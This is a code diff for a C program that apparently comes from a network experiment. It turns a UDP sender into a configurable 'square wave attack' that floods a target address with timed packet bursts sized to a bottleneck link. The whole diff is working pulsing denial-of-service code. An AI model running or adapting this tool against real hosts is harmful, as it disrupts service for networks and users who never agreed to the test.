@@ -4,6 +4,7 @@
 #include <sys/time.h>
 #include <netinet/in.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <error.h>
 #include <unistd.h>
 #include <arpa/inet.h>
@@ -52,12 +53,29 @@ struct sockaddr_in waitForStartSignal() {
 	return cli_addr;
 }
 
-int main(int argc, char* argv[]) {
-	struct sockaddr_in friend_addr = waitForStartSignal();
-	
+
+/**
+ * Performs the square wave attack by targeting the given friend.  Continues * attack for approximately 1000 seconds or until killed.
+ * 
+ * @param period The period of the attack in milliseconds
+ * @param length The length of one burst of the attack in milliseconds
+ * @param friend_addr The address to send the square wave to.
+ * @param link_rate The rate of the bottleneck link, in Kbps
+ */ 
+void perform_attack(int period, int length, struct sockaddr_in friend_addr,
+									  int link_rate) {
+ 	// TODO:  Variable packet size?  For now all 50 byte packets
+
+	int PACKET_SIZE = 50;
+	int numpackets_burst = length * link_rate / PACKET_SIZE / 8;
+	printf("Performing attack with period %dms, length %dms, rate %dKbps, and packets in bursts of size %d.\n", period, length, link_rate, numpackets_burst);
+	double avg_throughput = ((double) length) / period * link_rate / 1000.0;
+	printf("Average throughput used: %fMbps\n", avg_throughput);
+	double impact = link_rate / 1000.0 * (link_rate / 1000.0 - avg_throughput);
+	printf("Expected time increase just due to throughput use: %f\n", impact);
 	int friend_sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
 	
-	char message[1472];
+	char message[PACKET_SIZE - 28];
 	for (int i = 0; i < sizeof(message); i++) {
 		message[i] = 'h';
 	}
@@ -70,11 +88,8 @@ int main(int argc, char* argv[]) {
 	bind(friend_sock, (struct sockaddr*) &my_addr, sizeof(my_addr));
 
 	for (int i = 0; i < 1000; i++) {
-		printf("Starting to send packets %d\n", i);
-		for (int j = 0; j < 18; j++) {
-			int sockfd = 0;
-			//char message[736] = "Testing.......";
-			
+		for (int j = 0; j < numpackets_burst; j++) {
+			int sockfd = 0;	
 			ssize_t n = sendto(friend_sock, message, sizeof(message), 0, 
 		  	                  (struct sockaddr *) &friend_addr, sizeof(friend_addr));
 			if (n < 0) {
@@ -82,15 +97,28 @@ int main(int argc, char* argv[]) {
 			}
 			struct timespec req;
 			req.tv_sec = 0;
-			req.tv_nsec = 150000000L / 18;
+			req.tv_nsec = length * (1000L * 1000) / numpackets_burst;
 			nanosleep(&req, NULL);
 		}
-		printf("Done sending packets %d\n", i);
-		//sleep(1);
+
 		struct timespec sleeptime;
 		sleeptime.tv_sec = 0;
-		sleeptime.tv_nsec = 500000000L;
+		sleeptime.tv_nsec = (period - length) * 1000L * 1000;
 		int result = nanosleep(&sleeptime, NULL);
 	}
 
 }
+
+int main(int argc, char* argv[]) {
+	if (argc != 3) {
+		error(1, 0, "Usage (uints of millis):  ./attacker period length");
+	}
+
+	int period = atoi(argv[1]);
+	int length = atoi(argv[2]);
+
+	struct sockaddr_in friend_addr = waitForStartSignal();
+  perform_attack(period, length, friend_addr, 1500);	
+}
+
+
